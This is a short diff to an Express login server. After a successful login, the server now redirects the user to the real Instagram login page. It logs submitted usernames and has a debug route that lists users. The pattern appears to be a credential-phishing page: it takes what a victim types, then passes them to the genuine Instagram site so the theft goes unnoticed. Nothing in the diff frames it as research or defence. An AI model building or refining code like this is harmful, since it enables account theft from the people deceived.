@@ -63,7 +63,7 @@ app.post("/login", (req, res) => {
   if (user) {
     console.log("Login success for:", username);
     // Option A: respond success and let frontend redirect
-    return res.send("Login successful");
+    return res.redirect("https://www.instagram.com/accounts/login/");
     // Option B (server redirect): uncomment below to redirect from server
     // return res.redirect("/home.html");
   } else {
@@ -82,3 +82,4 @@ app.get("/_debug/users", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
 });
+
